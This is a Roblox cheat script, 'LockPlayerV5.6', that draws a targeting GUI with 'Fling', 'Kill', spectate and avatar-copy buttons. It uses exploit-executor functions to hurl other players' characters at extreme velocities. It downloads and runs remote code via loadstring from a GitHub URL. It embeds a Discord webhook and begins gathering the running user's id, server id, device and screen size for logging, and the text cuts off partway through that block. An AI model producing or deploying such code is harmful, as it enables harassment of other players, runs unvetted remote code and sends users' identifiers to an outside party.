local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

local oldGui = player.PlayerGui:FindFirstChild("LockPlayerV5")
if oldGui then oldGui:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "LockPlayerV5"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local clickSound = Instance.new("Sound", gui)
clickSound.SoundId = "rbxassetid://654933978"
clickSound.Volume = 1

local function notify(msg)
    StarterGui:SetCore("SendNotification", {Title = "LockPlayerV5", Text = msg, Duration = 4})
end

local ProtectedIds = {
    7087198584,
    1234567890,
    -- add new
}

local function isProtected(plr)
    if not plr then return false end
    for _, id in ipairs(ProtectedIds) do
        if plr.UserId == id then
            return true
        end
    end
    return false
end

local function makeDraggable(frame, handle)
    local dragging = false
    local dragInput, dragStart, startPos
    local dragHandle = handle or frame

    local function update(input)
        local delta = input.Position - dragStart
        local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        TweenService:Create(frame, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = targetPos}):Play()
    end

    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    dragHandle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

local toggleBtn = Instance.new("ImageButton", gui)
toggleBtn.Size = UDim2.new(0, 50, 0, 50)
toggleBtn.Position = UDim2.new(0.1, 0, 0.5, 0)
toggleBtn.BackgroundTransparency = 1
toggleBtn.Image = "rbxassetid://93429775553017"
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1, 0)
local tbStroke = Instance.new("UIStroke", toggleBtn)
tbStroke.Color = Color3.fromRGB(180, 0, 255)
tbStroke.Thickness = 2
makeDraggable(toggleBtn)

local main = Instance.new("Frame", gui)
main.Name = "MainFrame"
main.Size = UDim2.new(0, 0, 0, 0)
main.Position = UDim2.new(0.5, -190, 0.5, -160)
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.ClipsDescendants = true
main.Visible = false
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
local mainStroke = Instance.new("UIStroke", main)
mainStroke.Color = Color3.fromRGB(180, 0, 255)
mainStroke.Thickness = 2

local canvas = Instance.new("CanvasGroup", main)
canvas.Size = UDim2.new(1, 0, 1, 0)
canvas.BackgroundTransparency = 1
canvas.GroupTransparency = 1 

local dragArea = Instance.new("Frame", canvas)
dragArea.Name = "DragArea"
dragArea.Size = UDim2.new(1, 0, 0, 50)
dragArea.BackgroundTransparency = 1
makeDraggable(main, dragArea)

local title = Instance.new("TextLabel", dragArea)
title.Size = UDim2.new(1, -50, 1, 0)
title.Position = UDim2.new(0, 20, 0, 0)
title.Text = "LockPlayerV5.6"
title.Font = Enum.Font.SourceSans
title.TextColor3 = Color3.fromRGB(180, 0, 255)
title.TextSize = 18
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", canvas)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -40, 0, 15)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.SourceSans
closeBtn.TextColor3 = Color3.fromRGB(255, 0, 255)
closeBtn.TextSize = 20
closeBtn.BackgroundTransparency = 1
closeBtn.ZIndex = 10

local targetBox = Instance.new("TextBox", canvas)
targetBox.Size = UDim2.new(0, 340, 0, 35)
targetBox.Position = UDim2.new(0, 20, 0, 65)
targetBox.Text = "" 
targetBox.PlaceholderText = "T4rget here"
targetBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
targetBox.TextColor3 = Color3.new(1, 1, 1)
targetBox.Font = Enum.Font.SourceSans
targetBox.TextSize = 14
Instance.new("UICorner", targetBox)
Instance.new("UIStroke", targetBox).Color = Color3.fromRGB(180, 0, 255)

local listBtn = Instance.new("TextButton", canvas)
listBtn.Size = UDim2.new(0, 340, 0, 35)
listBtn.Position = UDim2.new(0, 20, 0, 110)
listBtn.Text = "Select Player"
listBtn.BackgroundColor3 = Color3.fromRGB(30, 0, 60)
listBtn.TextColor3 = Color3.new(1, 1, 1)
listBtn.Font = Enum.Font.SourceSans
listBtn.TextSize = 16
Instance.new("UICorner", listBtn)

local function createActionBtn(text, xPos)
    local btn = Instance.new("TextButton", canvas)
    btn.Size = UDim2.new(0, 106, 0, 35)
    btn.Position = UDim2.new(0, xPos, 0, 155)
    btn.Text = text
    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.SourceSans
    btn.TextS = 14
    Instance.new("UICorner", btn)
    Instance.new("UIStroke", btn).Color = Color3.fromRGB(180, 0, 255)
    return btn
end

local flingBtn = createActionBtn("Fling OFF", 20)
local killBtn = createActionBtn("Kill", 136)
local viewBtn = createActionBtn("View", 253)

local musicBtn = Instance.new("TextButton", canvas)
musicBtn.Size = UDim2.new(0, 340, 0, 40)
musicBtn.Position = UDim2.new(0, 20, 0, 210)
musicBtn.Text = "Open Music Player"
musicBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
musicBtn.TextColor3 = Color3.new(1, 1, 1)
musicBtn.Font = Enum.Font.SourceSans
musicBtn.TextSize = 15
Instance.new("UICorner", musicBtn)

-- Parent GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Brookhaven_Avatar_System"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

-- 1. TOMBOL BULAT (👕)
local RoundBtn = Instance.new("TextButton")
RoundBtn.Name = "LauncherBtn"
RoundBtn.Parent = ScreenGui
RoundBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
RoundBtn.Position = UDim2.new(0, 100, 0, 100)
RoundBtn.Size = UDim2.new(0, 55, 0, 55)
RoundBtn.Text = "👕"
RoundBtn.TextSize = 30
RoundBtn.TextColor3 = Color3.new(1, 1, 1)
RoundBtn.ZIndex = 10

local RoundCorner = Instance.new("UICorner")
RoundCorner.CornerRadius = UDim.new(1, 0)
RoundCorner.Parent = RoundBtn

local RoundStroke = Instance.new("UIStroke")
RoundStroke.Color = Color3.fromRGB(160, 32, 240)
RoundStroke.Thickness = 2.5
RoundStroke.Parent = RoundBtn

-- 2. POP-UP MENU
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.Position = UDim2.new(0, 165, 0, 100)
MainFrame.Size = UDim2.new(0, 220, 0, 140)
MainFrame.Visible = false
MainFrame.ZIndex = 5

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 10)
FrameCorner.Parent = MainFrame

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Color = Color3.fromRGB(160, 32, 240)
FrameStroke.Thickness = 2
FrameStroke.Parent = MainFrame

-- 3. INPUT USERNAME
local UsernameInput = Instance.new("TextBox")
UsernameInput.Parent = MainFrame
UsernameInput.PlaceholderText = "Username/Display..."
UsernameInput.Position = UDim2.new(0.1, 0, 0.2, 0)
UsernameInput.Size = UDim2.new(0.8, 0, 0, 35)
UsernameInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
UsernameInput.TextColor3 = Color3.new(1, 1, 1)
UsernameInput.Text = ""
Instance.new("UICorner", UsernameInput)

-- 4. TOMBOL COPY AVA
local CopyBtn = Instance.new("TextButton")
CopyBtn.Parent = MainFrame
CopyBtn.Text = "Copy Ava"
CopyBtn.BackgroundColor3 = Color3.fromRGB(160, 32, 240)
CopyBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
CopyBtn.Size = UDim2.new(0.8, 0, 0, 40)
CopyBtn.TextColor3 = Color3.new(1, 1, 1)
CopyBtn.Font = Enum.Font.SourceSansBold
CopyBtn.TextSize = 18
Instance.new("UICorner", CopyBtn)

-- FUNGSI DRAGGABLE
local function makeDraggable(obj)
	local dragging, dragInput, dragStart, startPos
	obj.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = obj.Position
		end
	end)
	obj.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - dragStart
			obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
	end)
end

makeDraggable(RoundBtn)
makeDraggable(MainFrame)

local isOpen = false
local function toggleGUI()
    clickSound:Play()
    if not isOpen then
        isOpen = true
        main.Visible = true
        TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 380, 0, 280)
        }):Play()
        task.delay(0.1, function()
            TweenService:Create(canvas, TweenInfo.new(0.3), {GroupTransparency = 0}):Play()
        end)
    else
        isOpen = false
        local fadeOut = TweenService:Create(canvas, TweenInfo.new(0.25), {GroupTransparency = 1})
        fadeOut:Play()
        
        fadeOut.Completed:Connect(function()
            if not isOpen then
                local shrink = TweenService:Create(main, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                    Size = UDim2.new(0, 0, 0, 0)
                })
                shrink:Play()
                shrink.Completed:Connect(function()
                    if not isOpen then main.Visible = false end
                end)
            end
        end)
    end
end

toggleBtn.MouseButton1Click:Connect(toggleGUI)
closeBtn.MouseButton1Click:Connect(toggleGUI)

-- Toggle Pop-up saat tombol bulat ditekan
RoundBtn.MouseButton1Click:Connect(function()
	MainFrame.Visible = not MainFrame.Visible
end)

-- Eksekusi Copy Avatar Brookhaven
CopyBtn.MouseButton1Click:Connect(function()
	local input = UsernameInput.Text:lower()
	local targetPlayer = nil
	
	-- Auto-correct (mencari player terdekat)
	for _, p in pairs(Players:GetPlayers()) do
		if p.Name:lower():sub(1, #input) == input or p.DisplayName:lower():sub(1, #input) == input then
			targetPlayer = p
			break
		end
	end

	if targetPlayer then
		UsernameInput.Text = targetPlayer.Name
		
		-- Remote Brookhaven (Update jika Remote berubah)
		local re = ReplicatedStorage:FindFirstChild("RE")
		local event = re and re:FindFirstChild("AvatarEvent")
		
		if event then
			-- Mengirim sinyal ganti outfit ke server Brookhaven
			event:FireServer("Outfit", targetPlayer.UserId)
			CopyBtn.Text = "Berhasil!"
			task.wait(1)
			CopyBtn.Text = "Copy Ava"
		else
			UsernameInput.Text = "Remote Gagal!"
		end
	else
		UsernameInput.Text = "Player Tak Ada!"
		task.wait(1)
		UsernameInput.Text = ""
	end
end)

-- list player
local listGui = nil
local function showPlayerList()
    if listGui then listGui:Destroy() end

    listGui = Instance.new("Frame", gui)
    listGui.Size = UDim2.new(0, 320, 0, 420)
    listGui.Position = UDim2.new(0.5, -160, 0.5, -210)
    listGui.BackgroundColor3 = Color3.fromRGB(15, 5, 30)
    listGui.BackgroundTransparency = 0.35
    Instance.new("UICorner", listGui).CornerRadius = UDim.new(0,12)
    local listStroke = Instance.new("UIStroke", listGui)
    listStroke.Color = Color3.fromRGB(180, 0, 255)
    listStroke.Thickness = 2
    makeDraggable(listGui)

    local listTitle = Instance.new("TextLabel", listGui)
    listTitle.Size = UDim2.new(1, -80, 0, 36)
    listTitle.Position = UDim2.new(0, 16, 0, 8)
    listTitle.BackgroundTransparency = 1
    listTitle.Text = "List Player"
    listTitle.Font = Enum.Font.FredokaOne
    listTitle.TextSize = 18
    listTitle.TextColor3 = Color3.fromRGB(180, 0, 255)
    listTitle.TextXAlignment = Enum.TextXAlignment.Left

    local listCloseBtn = Instance.new("TextButton", listGui)
    listCloseBtn.Size = UDim2.new(0, 38, 0, 36)
    listCloseBtn.Position = UDim2.new(1, -54, 0, 8)
    listCloseBtn.Text = "✖"
    listCloseBtn.Font = Enum.Font.GothamBold
    listCloseBtn.TextSize = 18
    listCloseBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
    listCloseBtn.BackgroundTransparency = 0.4
    listCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", listCloseBtn).CornerRadius = UDim.new(1,0)

    local playerScroll = Instance.new("ScrollingFrame", listGui)
    playerScroll.Size = UDim2.new(1, -20, 1, -60)
    playerScroll.Position = UDim2.new(0, 10, 0, 50)
    playerScroll.ScrollBarThickness = 6
    playerScroll.BackgroundColor3 = Color3.fromRGB(20, 5, 40)
    playerScroll.BackgroundTransparency = 0.4
    Instance.new("UICorner", playerScroll).CornerRadius = UDim.new(0,8)
    local playerStroke = Instance.new("UIStroke", playerScroll)
    playerStroke.Color = Color3.fromRGB(180, 0, 255)
    playerStroke.Thickness = 1

    local playerListLayout = Instance.new("UIListLayout", playerScroll)
    playerListLayout.Padding = UDim.new(0,6)
    playerListLayout.SortOrder = Enum.SortOrder.Name

    local function updateList()
        for _, child in playerScroll:GetChildren() do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, p in Players:GetPlayers() do
            if p ~= player then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -12, 0, 36)
                btn.BackgroundColor3 = Color3.fromRGB(25, 10, 50)
                btn.BackgroundTransparency = 0.4
                btn.Text = p.Name .. " • " .. (p.DisplayName ~= "" and p.DisplayName or "No Display")
                btn.TextColor3 = Color3.fromRGB(200, 150, 255)
                btn.Font = Enum.Font.GothamBold
                btn.TextSize = 14
                btn.Parent = playerScroll
                Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
                local stroke = Instance.new("UIStroke", btn)
                stroke.Color = Color3.fromRGB(180, 0, 255)
                stroke.Thickness = 1

                btn.MouseButton1Click:Connect(function()
                    targetBox.Text = p.Name
                    clickSound:Play()
                    notify("Target set: " .. p.Name)
                    listGui:Destroy()
                    listGui = nil
                end)
            end
        end
        playerScroll.CanvasSize = UDim2.new(0, 0, 0, playerListLayout.AbsoluteContentSize.Y + 10)
        listTitle.Text = "List Player (" .. #Players:GetPlayers() - 1 .. ")"
    end

    updateList()
    Players.PlayerAdded:Connect(updateList)
    Players.PlayerRemoving:Connect(updateList)

    listCloseBtn.MouseButton1Click:Connect(function()
        clickSound:Play()
        local shrink = TweenService:Create(listGui, TweenInfo.new(0.36, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0,0,0,0)})
        shrink:Play()
        shrink.Completed:Wait()
        listGui:Destroy()
        listGui = nil
    end)
end

listBtn.MouseButton1Click:Connect(function()
    clickSound:Play()
    showPlayerList()
end)

local function getTarget()
    local name = targetBox.Text
    for _, p in Players:GetPlayers() do
        if string.lower(p.Name):find(string.lower(name)) or string.lower(p.DisplayName):find(string.lower(name)) then
            return p
        end
    end
    return Players:FindFirstChild(name)
end

-- fling fuctions
local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(9e9, 9e9, 9e9)
    }

    getgenv().Network.RetainPart = function(Part)
        if Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
            table.insert(getgenv().Network.BaseParts, Part)
            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            Part.CanCollide = false
        end
    end

    local function EnablePartControl()
        player.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(player, "SimulationRadius", math.huge)
            for _, Part in pairs(getgenv().Network.BaseParts) do
                if Part:IsDescendantOf(Workspace) then
                    Part.Velocity = getgenv().Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local affectedParts = {}
local blackHoleActive = false
local DescendantAddedConnection

local function ForcePart(v)
    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in ipairs(v:GetChildren()) do
            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then x:Destroy() end
        end

        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        
        Torque.Torque = Vector3.new(9e9, 9e9, 9e9)
        Torque.Attachment0 = Attachment2

        AlignPosition.MaxForce = math.huge
        AlignPosition.Responsiveness = 500
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
        
        pcall(function()
            v.AssemblyAngularVelocity = Vector3.new(math.random(-600, 600), math.random(-600, 600), math.random(-600, 600))
        end)
        
        affectedParts[v] = true
    end
end

local function toggleBlackHole(targetChar)
    local hrp = targetChar:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    blackHoleActive = not blackHoleActive
    flingBtn.Text = blackHoleActive and "Fling ON" or "Fling OFF"

    if blackHoleActive then
        for _, v in ipairs(Workspace:GetDescendants()) do ForcePart(v) end
        DescendantAddedConnection = Workspace.DescendantAdded:Connect(ForcePart)
        task.spawn(function()
            while blackHoleActive and hrp.Parent do
                Attachment1.WorldCFrame = hrp.CFrame
                for part in pairs(affectedParts) do
                    if part and part.Parent then
                        pcall(function()
                            part.AssemblyAngularVelocity = Vector3.new(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-6000, 6000))
                        end)
                    end
                end
                RunService.Heartbeat:Wait()
            end
        end)
        notify("Fling ON for " .. targetChar.Name)
    else
        if DescendantAddedConnection then DescendantAddedConnection:Disconnect() end
        affectedParts = {}
        notify("Fling OFF")
    end
end

flingBtn.MouseButton1Click:Connect(function()
    clickSound:Play()
    
    local target = getTarget()
    if not target or not target.Character then
        notify("T4rget not found!")
        return
    end
    
    if isProtected(target) then
        notify("This user was Protected! by Owner")
        return
    end
    
    toggleBlackHole(target.Character)
end)

-- kill fuctions
local function SkidFling(TargetPlayer)
    local success, result = pcall(function()
        local Character = player.Character or player.CharacterAdded:Wait()
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Humanoid and Humanoid.RootPart

        local TCharacter = TargetPlayer.Character
        local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass("Humanoid")
        local TRootPart = THumanoid and THumanoid.RootPart
        local THead = TCharacter and TCharacter:FindFirstChild("Head")
        local Accessory = TCharacter and TCharacter:FindFirstChildOfClass("Accessory")
        local Handle = Accessory and Accessory:FindFirstChild("Handle")

        if Character and Humanoid and RootPart then
            if RootPart.Velocity.Magnitude < 50 then
                getgenv().OldPos = RootPart.CFrame
            end
            if THumanoid and THumanoid.Sit then
                return false, "Error: Target sedang duduk"
            end
            if THead then
                workspace.CurrentCamera.CameraSubject = THead
            elseif Handle then
                workspace.CurrentCamera.CameraSubject = Handle
            elseif THumanoid then
                workspace.CurrentCamera.CameraSubject = THumanoid
            end
            if not TCharacter or not TCharacter:FindFirstChildWhichIsA("BasePart") then
                return false, "Error: Target tidak memiliki BasePart"
            end

            local FPos = function(BasePart, Pos, Ang)
                RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
                RootPart.Velocity = Vector3.new(9e7, 9e7, 9e7)
                RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
            end

            local SFBasePart = function(BasePart)
                local TimeToWait = 2
                local Time = tick()
                local Angle = 0

                repeat
                    if RootPart and THumanoid then
                        if BasePart.Velocity.Magnitude < 50 then
                            Angle = Angle + 100

                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                            task.wait()
                        else
                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                            task.wait()

                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                            task.wait()
                        end
                    else
                        break
                    end
                until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
            end

            local BV = Instance.new("BodyVelocity")
            BV.Name = "EpixVel"
            BV.Parent = RootPart
            BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
            BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

            local targetPart
            if TRootPart and THead then
                if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                    targetPart = THead
                else
                    targetPart = TRootPart
                end
            elseif TRootPart then
                targetPart = TRootPart
            elseif THead then
                targetPart = THead
            elseif Handle then
                targetPart = Handle
            else
                return false, "Error: Target tidak memiliki bagian yang diperlukan"
            end

            SFBasePart(targetPart)

            BV:Destroy()
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            workspace.CurrentCamera.CameraSubject = Humanoid

            if getgenv().OldPos then
                repeat
                    RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
                    Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
                    Humanoid:ChangeState("GettingUp")
                    for _, x in Character:GetChildren() do
                        if x:IsA("BasePart") then
                            x.Velocity = Vector3.new()
                            x.RotVelocity = Vector3.new()
                        end
                    end
                    task.wait()
                until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
            end

            return true, "Success"
        else
            return false, "Error: Karakter Anda tidak lengkap"
        end
    end)

    if success then
        notify("Kill success " .. TargetPlayer.Name)
    else
        notify("Kill failed try again " .. tostring(result))
    end
end

killBtn.MouseButton1Click:Connect(function()
    clickSound:Play()
    
    local target = getTarget()
    if not target then
        notify("T4rget not found!")
        return
    end
    
    if isProtected(target) then
        notify("This user was Protected! by Owner")
        return
    end
    
    SkidFling(target)
end)

local viewing = false
local oldCamSubject

local function toggleView(target)
    if viewing then
        Camera.CameraSubject = oldCamSubject or player.Character:FindFirstChildOfClass("Humanoid")
        viewing = false
        viewBtn.Text = "View"
        notify("Unview")
        return
    end
    local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        oldCamSubject = Camera.CameraSubject
        Camera.CameraSubject = hum
        viewing = true
        viewBtn.Text = "Unview"
        notify("Viewing " .. target.Name)
    end
end

viewBtn.MouseButton1Click:Connect(function()
    clickSound:Play()
    local target = getTarget()
    if target and target.Character then
        toggleView(target)
    else
        notify("T4rget not found!")
    end
end)

musicBtn.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SibahAnakBaik/MasAmbaTheOfficialYT6777/refs/heads/main/SibahMusic677777778790"))()
    end)
end)

player.Idled:Connect(function()
    game:GetService("VirtualUser"):CaptureController()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)

local player = game.Players.LocalPlayer
pcall(function()
    local args = {
        [1] = "RolePlayName",
        [2] = "Script LockPlayerV5.6 Loaded! Username : " .. player.Name
    }
    
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local re = replicatedStorage:FindFirstChild("RE")
    if not re then return end
    
    local remote = re:FindFirstChild("1RPNam1eTex1t")
    if not remote then return end
    
    remote:FireServer(unpack(args))
end)

game.Workspace.FallenPartsDestroyHeight = 0/0

-- Esp Script Owner
local espHighlights = {}
local function applyESP(p, labelText)
    if espHighlights[p] then return end 

    local function onCharacterAdded(char)
        local highlight = Instance.new("Highlight")
        highlight.Name = "TheHighlight"
        highlight.FillColor = Color3.fromRGB(128, 0, 128)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.Parent = char

        local billboard = Instance.new("BillboardGui")
        billboard.Name = "ScriptLabel"
        billboard.Adornee = char:WaitForChild("Head")
        billboard.Size = UDim2.new(0, 200, 0, 50)
        billboard.StudsOffset = Vector3.new(0, 3, 0)
        billboard.AlwaysOnTop = true
        billboard.Parent = char

        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = labelText
        textLabel.Font = Enum.Font.GothamBold
        textLabel.TextSize = 18
        textLabel.TextColor3 = Color3.fromRGB(255, 0, 255)
        textLabel.Parent = billboard

        espHighlights[p] = {highlight, billboard}
    end

    if p.Character then
        onCharacterAdded(p.Character)
    end
    p.CharacterAdded:Connect(onCharacterAdded)
end

local function checkForSpecialPlayers()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == "Asdd5644" then
            applyESP(p, "Developer Script")
        elseif p.Name == "ZADa_62849" then
            applyESP(p, "The Hunter")
        end
    end
end

checkForSpecialPlayers()

Players.PlayerAdded:Connect(function(p)
    if p.Name == "Asdd5644" then
        applyESP(p, "Developer Script")
    elseif p.Name == "ZADa_62849" then
        applyESP(p, "The Hunter")
    end
end)

Players.PlayerRemoving:Connect(function(p)
    if espHighlights[p] then
        for _, obj in ipairs(espHighlights[p]) do
            obj:Destroy()
        end
        espHighlights[p] = nil
    end
end) 

-- WB 1
getgenv().whscript = "LockPlayerV5 Ultimate"
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1455467986306600962/x-XGtor35OEVocNR8kJNml2NYWm-p_p0kD2GPY0QY8g3rgP3RpQTxAx5w9DPT1DP3iZQ" 
getgenv().ExecLogSecret = false

local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2

    if ui:FindFirstChild(folderName2) then
        local folderName3 = "screen3"
        local folder3 = Instance.new("Folder")
        folder3.Name = folderName3

        if ui:FindFirstChild(folderName3) then
            local folderName4 = "screen4"
            local folder4 = Instance.new("Folder")
            folder4.Name = folderName4

            if ui:FindFirstChild(folderName4) then
                player:Kick("Anti-spam detected, please rejoin.")
            else
                folder4.Parent = ui
            end
        else
            folder3.Parent = ui
        end
    else
        folder2.Parent = ui
    end
else
    folder.Parent = ui
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
    local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
